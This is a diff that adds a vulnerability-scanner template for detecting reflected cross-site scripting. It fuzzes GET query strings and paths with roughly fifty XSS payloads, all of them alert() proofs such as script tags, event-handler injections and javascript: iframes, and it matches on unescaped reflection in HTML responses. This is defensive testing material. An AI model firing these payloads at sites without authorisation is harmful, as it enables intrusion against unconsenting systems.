@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>"
+        - "<colgroup draggable=\"true\" ondragend=\"alert(1)\">test</colgroup>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>"
+        - "<frameset><frame draggable=\"true\" ondragleave=\"alert(1)\">test</frame></frameset>"
+        - "<basefont onbeforecut=\"alert(1)\" contenteditable>test</basefont>"
+        - "<canvas onmouseover=\"alert(1)\">test</canvas>"
+        - "<svg><noscript onload=alert(1)></noscript>"
+        - "<iframe src=\"about:<html><head><style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></dialog>\">"
+        - "<SCRIPT>alert(1337)</SCRIPT>"
+        - "<style>:target {color: red;}</style><progress id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></progress>"
+        - "<style>@keyframes x{}</style><svg style=\"animation-name:x\" onanimationend=\"alert(1)\"></svg>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>"
+        - "<picture onclick=\"alert(1)\">test</picture>"
+        - "<map id=x tabindex=1 onfocusin=alert(1)></map>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input autofocus>"
+        - "<output onkeydown=\"alert(1)\" contenteditable>test</output>"
+        - "<embed srcdoc=\"&lt;img/src=xxx:x onerror\\x3d\\x27javascript:alert(1)'>"
+        - "<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><optgroup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></optgroup>"
+        - "<script>alert(1)</script>"
+        - "<font id=x tabindex=1 onfocusin=alert(1)></font>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>"
+        - "<aside draggable=\"true\" ondragend=\"alert(1)\">test</aside>"
+        - "<a href=\"http://ha.ckers.org/scriptlet.html\" id=\"fuzzelement1\">test</a>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>"
+        - "<embed srcdoc=\"&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt;\">"
+        - "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>test"
+        - "<script>alert(\"XSS\");</script>"
+        - "<embed id=x onerror=javascript:alert(1)></embed>"
+        - "<optgroup onbeforepaste=\"alert(1)\" contenteditable>test</optgroup>"
+        - "<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<iframe><a href=\"http://xssme.html5sec.org/\">XSSME</a></iframe>"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>"
+        - "<IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<script>alert(1)</script>"
+        - "<input type=image src=onerror=alert(1)"
+        - "<iframe src=\"javascript:alert(1)\"></iframe>"
+        - "<IMG SRC=x onkeyup=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<embed draggable=\"true\" ondragend=\"alert(1)\">test</embed>"
+        - "<dialog draggable=\"true\" ondragleave=\"alert(1)\">test</dialog>"
+        - "<video onkeypress=\"alert(1)\" contenteditable>test</video>"
+        - "<marquee draggable=\"true\" ondragstart=\"alert(1)\">test</marquee>"
+        - "<form draggable=\"true\" ondragend=\"alert(1)\">test</form>"
+        - "<colgroup onclick=\"alert(1)\">test</colgroup>"
+        - "<iframe draggable=\"true\" ondragend=\"alert(1)\">test</iframe>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
